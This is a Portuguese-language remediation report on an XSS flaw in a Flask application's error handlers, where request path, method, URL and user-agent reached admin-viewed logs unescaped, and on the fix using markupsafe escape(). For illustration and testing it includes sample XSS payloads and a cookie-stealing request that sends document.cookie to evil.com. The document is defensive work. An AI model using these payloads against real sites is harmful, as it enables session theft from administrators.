# Correção CWE-20,79,80: Cross-Site Scripting (XSS) em handlers.py

## Vulnerabilidade Identificada
**Ficheiro:** `app/routes/handlers.py`  
**Linhas:** 16-17, 33, 82, 88, 100  
**Severidade:** MÉDIA-ALTA  
**CWE:** CWE-20 (Improper Input Validation), CWE-79 (XSS), CWE-80 (XSS)

## Descrição da Vulnerabilidade

### Dados de Request Não Sanitizados
- **Problema:** Valores de `request.path`, `request.method`, `request.url`, `request.user_agent.string` usados sem sanitização
- **Risco:** XSS refletido em logs, mensagens de erro, ou respostas
- **Impacto:** Execução de JavaScript malicioso em contextos onde logs são exibidos

### Locais Vulneráveis

#### 1. Função `error_rate_key()` (linha 17)
```python
return f"{get_remote_address()}:{request.path}"  # ❌ XSS
```

#### 2. Função `log_error()` (linha 33)
```python
detalhes=f"{detalhes[:500]} | Path: {request.path} | Method: {request.method} | UA: {request.user_agent.string[:200]}"  # ❌ XSS
```

#### 3. Handler `error_404()` (linha 82)
```python
log_error("404 Not Found", request.path)  # ❌ XSS
```

#### 4. Handler `error_405()` (linha 88)
```python
log_error("405 Method Not Allowed", request.method)  # ❌ XSS
```

#### 5. Handler `error_414()` (linha 100)
```python
log_error("414 URI Too Long", request.url)  # ❌ XSS
```

### Cenário de Exploração
1. Atacante acede URL: `https://agrokongo.ao/<script>alert('XSS')</script>`
2. Path malicioso é logado sem sanitização
3. Admin visualiza logs no painel administrativo
4. JavaScript é executado no browser do admin
5. Possível roubo de sessão, CSRF, ou outras ações maliciosas

## Correção Implementada

### Sanitização com escape() em Todos os Inputs

#### 1. `error_rate_key()`
**Antes:**
```python
return f"{get_remote_address()}:{request.path}"
```

**Depois:**
```python
return f"{get_remote_address()}:{escape(request.path)}"
```

#### 2. `log_error()`
**Antes:**
```python
detalhes=f"{detalhes[:500]} | Path: {request.path} | Method: {request.method} | UA: {request.user_agent.string[:200]}"
```

**Depois:**
```python
detalhes=f"{escape(detalhes[:500])} | Path: {escape(request.path)} | Method: {escape(request.method)} | UA: {escape(request.user_agent.string[:200])}"
```

#### 3. `error_404()`
**Antes:**
```python
log_error("404 Not Found", request.path)
```

**Depois:**
```python
log_error("404 Not Found", escape(request.path))
```

#### 4. `error_405()`
**Antes:**
```python
log_error("405 Method Not Allowed", request.method)
```

**Depois:**
```python
log_error("405 Method Not Allowed", escape(request.method))
```

#### 5. `error_414()`
**Antes:**
```python
log_error("414 URI Too Long", request.url)
```

**Depois:**
```python
log_error("414 URI Too Long", escape(request.url[:500]))
```

## Camadas de Proteção

1. ✅ **escape() em error_rate_key**: Sanitiza path para rate limiting
2. ✅ **escape() em log_error**: Sanitiza todos os campos de request (path, method, UA)
3. ✅ **escape() em error_404**: Sanitiza path antes de logar
4. ✅ **escape() em error_405**: Sanitiza method antes de logar
5. ✅ **escape() em error_414**: Sanitiza URL e limita tamanho (500 chars)
6. ✅ **escape() já existente**: Handlers 400, 403, 500, 503 já usavam escape()

## Função escape() do MarkupSafe

### O que faz?
```python
from markupsafe import escape

escape("<script>alert('XSS')</script>")
# → "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
```

### Caracteres Escapados
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&#39;`

## Impacto da Correção

### Segurança
- ✅ Previne XSS refletido em logs
- ✅ Protege admins que visualizam logs
- ✅ Previne injeção de HTML/JavaScript em mensagens de erro
- ✅ Sanitização consistente em todos os handlers

### Integridade de Logs
- ✅ Logs seguros para visualização em HTML
- ✅ Dados de request preservados mas escapados
- ✅ Auditoria mantém informação útil sem risco

### Compliance
- ✅ OWASP Top 10 - A03:2021 (Injection)
- ✅ CWE-79 (Cross-site Scripting)
- ✅ Defense in depth (múltiplas camadas)

## Contexto de Risco

### Por que Logs Precisam de Sanitização?
1. **Painel Admin**: Logs exibidos em interface web
2. **Ferramentas de Monitorização**: Dashboards podem renderizar HTML
3. **Relatórios**: Logs exportados para HTML/PDF
4. **Stored XSS**: Payload armazenado em DB, executado depois

### Exemplo Real de Ataque
```
GET /<script>fetch('https://evil.com?cookie='+document.cookie)</script> HTTP/1.1

# Sem sanitização:
Log: "404 Not Found | Path: /<script>fetch('https://evil.com?cookie='+document.cookie)</script>"

# Admin visualiza log → Cookie roubado ❌

# Com sanitização:
Log: "404 Not Found | Path: /&lt;script&gt;fetch(...)&lt;/script&gt;"

# Admin visualiza log → Texto seguro ✅
```

## Testes Recomendados

1. **XSS Simples:** `/<script>alert(1)</script>` → Escapado ✅
2. **XSS em User-Agent:** `User-Agent: <img src=x onerror=alert(1)>` → Escapado ✅
3. **XSS em Method:** `METHOD: <svg/onload=alert(1)>` → Escapado ✅
4. **URL Longa:** URL com 10000 chars + XSS → Truncado e escapado ✅
5. **Visualização de Logs:** Verificar que logs não executam JavaScript ✅

## Handlers Já Protegidos

Os seguintes handlers já usavam `escape()` antes da correção:
- ✅ `error_400()`: `escape(error.description)`
- ✅ `error_403()`: `escape(error.description)`
- ✅ `error_500()`: `escape(error)`
- ✅ `error_503()`: `escape(error)`

## Status
✅ **CORRIGIDO** - Todos os dados de request sanitizados com escape() para prevenir XSS em logs e mensagens de erro
